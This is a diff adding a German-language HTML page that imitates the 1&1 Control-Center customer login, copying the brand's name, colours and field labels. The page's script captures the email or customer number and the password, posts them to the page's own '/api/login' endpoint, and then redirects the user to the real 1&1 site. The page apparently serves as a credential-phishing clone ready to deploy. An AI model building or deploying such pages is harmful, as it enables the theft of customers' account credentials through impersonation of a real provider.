@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>1&amp;1 Kunden-Login - Anmeldung zu Ihrem Control-Center</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: #003da5;
+      padding: 0 24px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-box {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #ffffff;
+      border-radius: 4px;
+      padding: 4px 10px;
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+      text-decoration: none;
+    }
+
+    /* ── MAIN ── */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 48px 16px 40px;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 6px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.10);
+      width: 100%;
+      max-width: 400px;
+      padding: 32px 32px 28px;
+    }
+
+    .card-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #003da5;
+      margin-bottom: 24px;
+    }
+
+    /* ── INPUTS ── */
+    .field {
+      position: relative;
+      margin-bottom: 14px;
+    }
+
+    .field input {
+      width: 100%;
+      height: 48px;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 4px;
+      padding: 12px 42px 12px 14px;
+      font-size: 15px;
+      font-family: inherit;
+      color: #1a1a1a;
+      outline: none;
+      transition: border-color 0.15s;
+      background: #fff;
+    }
+
+    .field input:focus {
+      border-color: #e87722;
+      box-shadow: 0 0 0 2px rgba(232,119,34,0.15);
+    }
+
+    .field input::placeholder { color: #999; font-size: 14px; }
+
+    .field .icon-right {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #666;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+
+    /* ── LINKS ROW ── */
+    .links-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 18px;
+      font-size: 13px;
+    }
+
+    .links-row a {
+      color: #003da5;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .links-row a:hover { text-decoration: underline; }
+
+    /* ── BUTTONS ── */
+    .btn-yellow {
+      width: 100%;
+      height: 48px;
+      background: #ffd400;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #003da5;
+      cursor: pointer;
+      font-family: inherit;
+      letter-spacing: 0.01em;
+      transition: background 0.15s;
+      margin-bottom: 24px;
+    }
+
+    .btn-yellow:hover { background: #f0c800; }
+
+    .btn-blue {
+      width: 100%;
+      height: 48px;
+      background: #003da5;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #ffffff;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+    }
+
+    .btn-blue:hover { background: #002d80; }
+
+    /* ── DIVIDER ── */
+    .divider {
+      border: none;
+      border-top: 1px solid #e8e8e8;
+      margin: 0 0 20px;
+    }
+
+    /* ── 2FA SECTION ── */
+    .twofa-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #003da5;
+      margin-bottom: 6px;
+    }
+
+    .twofa-desc {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+
+    /* ── TOOLTIP ICON ── */
+    .info-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 1.5px solid #999;
+      color: #666;
+      font-size: 12px;
+      font-weight: 700;
+      font-style: italic;
+      font-family: Georgia, serif;
+      cursor: help;
+    }
+
+    /* ── EYE ICON SVG ── */
+    .eye-icon { width:20px;height:20px;stroke:#888;fill:none;stroke-width:1.8; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <a class="logo-box" href="#">1&amp;1</a>
+  </header>
+
+  <main>
+    <div class="card">
+      <h1 class="card-title">Login 1&amp;1 Control-Center</h1>
+
+      <form id="login-form" method="POST" action="/api/login">
+
+        <!-- Email / Kundennummer -->
+        <div class="field">
+          <input
+            type="text"
+            id="email"
+            name="email"
+            placeholder="E-Mail oder Kundennummer"
+            autocomplete="username"
+            required
+          />
+          <span class="icon-right">
+            <span class="info-icon" title="Ihre Kundennummer finden Sie auf Ihren Rechnungen von 1&1.">i</span>
+          </span>
+        </div>
+
+        <!-- Password -->
+        <div class="field">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Passwort"
+            autocomplete="current-password"
+            required
+            id="pw"
+          />
+          <span class="icon-right" onclick="togglePw()" style="cursor:pointer;">
+            <svg class="eye-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </span>
+        </div>
+
+        <!-- Links -->
+        <div class="links-row">
+          <a href="#">Passwort vergessen</a>
+          <a href="#">Zugang anlegen</a>
+        </div>
+
+        <!-- Login button -->
+        <button type="submit" class="btn-yellow">Login</button>
+
+      </form>
+
+      <hr class="divider" />
+
+      <!-- 2FA section -->
+      <div>
+        <p class="twofa-title">2-Faktor-Authentifizierung einrichten</p>
+        <p class="twofa-desc">Ich möchte meinen Zugang mit einem zweiten Faktor absichern.</p>
+        <button class="btn-blue" onclick="window.location.href='/'">Weiter</button>
+      </div>
+
+    </div>
+  </main>
+
+  <script>
+    function togglePw() {
+      const pw = document.getElementById("password");
+      pw.type = pw.type === "password" ? "text" : "password";
+    }
+
+    document.getElementById("login-form").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      await fetch("/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+      });
+      window.location.href = "https://control-center.1und1.de";
+    });
+  </script>
+
+</body>
+</html>
